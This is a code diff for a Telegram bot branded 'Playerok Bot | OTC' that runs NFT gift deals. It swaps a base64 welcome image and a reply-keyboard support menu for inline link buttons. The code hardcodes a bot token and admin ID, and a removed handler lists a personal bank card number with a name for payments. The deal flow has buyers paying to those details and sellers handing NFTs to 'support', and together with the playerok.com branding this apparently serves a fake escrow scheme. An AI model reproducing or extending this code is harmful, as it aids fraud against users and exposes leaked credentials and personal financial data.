@@ -1,7 +1,6 @@
 import asyncio
 import logging
 import secrets
-import base64
 from datetime import datetime
 from typing import Optional, Dict, List
 from enum import Enum
@@ -14,7 +13,6 @@ from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import (
     InlineKeyboardMarkup, InlineKeyboardButton,
     ReplyKeyboardMarkup, KeyboardButton,
-    BufferedInputFile
 )
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 from aiogram.utils.markdown import hbold, hcode
@@ -26,8 +24,8 @@ config.read('config.ini')
 
 BOT_TOKEN = '6906381286:AAGXzad1vlRV5aU5lhs8zMWBbaGWudgshA8'
 ADMIN_IDS = '2023413492'
-SUPPORT_USERNAME = 'SUPPORT_USERNAME'
-WEBSITE_URL = 'https://playerok.com/sell'
+SUPPORT_USERNAME = 'supporOTC'
+WEBSITE_URL = 'https://playerok.com'
 
 # Настройка логирования
 logging.basicConfig(level=logging.INFO)
@@ -41,10 +39,10 @@ dp = Dispatcher(storage=storage)
 SUPPORTED_CURRENCIES = {
     'STARS': '⭐ STARS',
     'TON': '💎 TON',
-    'RUB': '🇷🇺 Рубли',
-    'KZT': '🇰🇿 Тенге',
-    'BYN': '🇧🇾 Белорусские рубли',
-    'UAH': '🇺🇦 Гривны'
+    'RUB': '🇷🇺 RUB',
+    'KZT': '🇰🇿 KZT',
+    'BYN': '🇧🇾 BYN',
+    'UAH': '🇺🇦 UAH'
 }
 
 class DealStatus(Enum):
@@ -156,9 +154,8 @@ db = Database()
 # Клавиатуры
 def get_main_keyboard(user_id: int) -> ReplyKeyboardMarkup:
     keyboard = [
-        [KeyboardButton(text="🛒 Создать сделку"), KeyboardButton(text="📱 Профиль")],
-        [KeyboardButton(text="ℹ️ Поддержка"), KeyboardButton(text="🌐 Наш сайт")],
-        [KeyboardButton(text="💳 Реквизиты")]
+        [KeyboardButton(text="🛡 Создать сделку"), KeyboardButton(text="👤 Профиль")],
+        # Кнопки "Наш сайт" и "Поддержка" убраны из reply, они теперь инлайн в приветствии
     ]
     
     # Добавляем кнопку админ-панели для администраторов
@@ -167,6 +164,14 @@ def get_main_keyboard(user_id: int) -> ReplyKeyboardMarkup:
         keyboard.append([KeyboardButton(text="👑 Админ панель")])
     
     return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)
+
+def get_inline_links_keyboard() -> InlineKeyboardMarkup:
+    """Клавиатура с инлайн-ссылками на сайт и поддержку"""
+    builder = InlineKeyboardBuilder()
+    builder.button(text="🌐 Наш сайт", url=WEBSITE_URL)
+    builder.button(text="📞 Поддержка", url=f"tg://resolve?domain={SUPPORT_USERNAME}")
+    builder.adjust(2)  # Две кнопки в ряд
+    return builder.as_markup()
 
 def get_currencies_keyboard() -> InlineKeyboardMarkup:
     builder = InlineKeyboardBuilder()
@@ -207,11 +212,6 @@ def get_admin_keyboard() -> InlineKeyboardMarkup:
     builder.button(text="🔙 Назад", callback_data="admin_back")
     builder.adjust(2)
     return builder.as_markup()
-
-# Картинка для приветствия (base64 без префикса)
-WELCOME_IMAGE_BASE64 = (
-    "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"
-)
 
 # Обработчики команд
 @dp.message(CommandStart())
@@ -260,24 +260,28 @@ async def cmd_start(message: types.Message, command: CommandStart):
         )
         return
     
-    # Отправляем картинку с приветствием (корректно из base64)
-    image_data = base64.b64decode(WELCOME_IMAGE_BASE64)
-    photo = BufferedInputFile(image_data, filename="welcome.png")
+    # Отправляем текстовое приветствие с инлайн-кнопками на сайт и поддержку
+    welcome_text = (
+        f"{hbold('🛡 Playerok Bot | OTC')}\n\n"
+        f"Безопасный и удобный сервис для сделок!\n\n"
+        f"🔹 {hbold('Как это работает:')}\n"
+        f"1. Продавец создает сделку\n"
+        f"2. Покупатель оплачивает сделку по реквизитом\n"
+        f"3. Продавец отправляет NFT поддержке\n"
+        f"4. Поддержка проверяет и завершает сделку\n\n"
+        f"Выберите действие в меню ниже:"
+    )
     
-    await message.answer_photo(
-        photo=photo,
-        caption=(
-            f"{hbold('🛡 Playerok Bot | OTC')}\n\n"
-            f"Безопасный и удобный сервис для сделок!\n\n"
-            f"🔹 {hbold('Как это работает:')}\n"
-            f"1. Продавец создает сделку\n"
-            f"2. Покупатель оплачивает сделку по реквизитом\n"
-            f"3. Продавец отправляет NFT поддержке\n"
-            f"4. Поддержка проверяет и завершает сделку\n\n"
-            f"Выберите действие в меню ниже:"
-        ),
+    await message.answer(
+        welcome_text,
         reply_markup=get_main_keyboard(user_id),
         parse_mode="HTML"
+    )
+    
+    # Дополнительно отправляем инлайн-кнопки для быстрого доступа к сайту и поддержке
+    await message.answer(
+        "📌 Быстрые ссылки:",
+        reply_markup=get_inline_links_keyboard()
     )
 
 @dp.message(Command("admin"))
@@ -294,7 +298,7 @@ async def cmd_admin(message: types.Message):
         parse_mode="HTML"
     )
 
-@dp.message(F.text == "🛒 Создать сделку")
+@dp.message(F.text == "🛡 Создать сделку")
 async def create_deal_start(message: types.Message, state: FSMContext):
     await state.set_state(DealCreation.choosing_currency)
     await message.answer(
@@ -326,7 +330,7 @@ async def process_amount(message: types.Message, state: FSMContext):
     
     await state.update_data(amount=amount)
     await state.set_state(DealCreation.entering_description)
-    await message.answer("🎁 Введите ссылку(-и) на подарок(-и) в одном из форматов: https://... или t.me/... Например: t.me/nft/DurovsCap-1")
+    await message.answer("🎁 Введите ссылку(-и) на подарок(-и) в одном из форматов:  https://... или t.me/...  Например: t.me/nft/DurovsCap-1")
 
 @dp.message(DealCreation.entering_description)
 async def process_description(message: types.Message, state: FSMContext):
@@ -521,38 +525,6 @@ async def show_profile(message: types.Message):
             profile_text += f"{status_emoji} #{deal['deal_id']} - {deal['amount']} {deal['currency']} ({role})\n"
     
     await message.answer(profile_text, parse_mode="HTML")
-
-@dp.message(F.text == "ℹ️ Поддержка")
-async def show_support(message: types.Message):
-    # Отправляем только инлайн-кнопку со ссылкой на поддержку
-    kb = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(text="📨 Написать саппорту", url=f"tg://resolve?domain={SUPPORT_USERNAME}")
-    ]])
-    await message.answer(
-        f"📞 Служба поддержки",
-        reply_markup=kb
-    )
-
-@dp.message(F.text == "🌐 Наш сайт")
-async def show_website(message: types.Message):
-    # Отправляем только инлайн-кнопку со ссылкой на сайт
-    kb = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(text="🔗 Перейти на сайт", url=WEBSITE_URL)
-    ]])
-    await message.answer(
-        f"🌐 Наш официальный сайт",
-        reply_markup=kb
-    )
-
-@dp.message(F.text == "💳 Реквизиты")
-async def show_payment_details(message: types.Message):
-    payment_text = (
-        f"{hbold('💳 Платежные реквизиты')}\n\n"
-        f"Для оплаты сделок используйте следующие реквизиты:\n\n"
-        f"⭐ Звезды: через бота\n"
-        f"₽ Рубли: 2204 1201 3279 4013 - Maркин Ярослав\n"
-    )
-    await message.answer(payment_text, parse_mode="HTML")
 
 # Админ панель
 @dp.message(F.text == "👑 Админ панель")
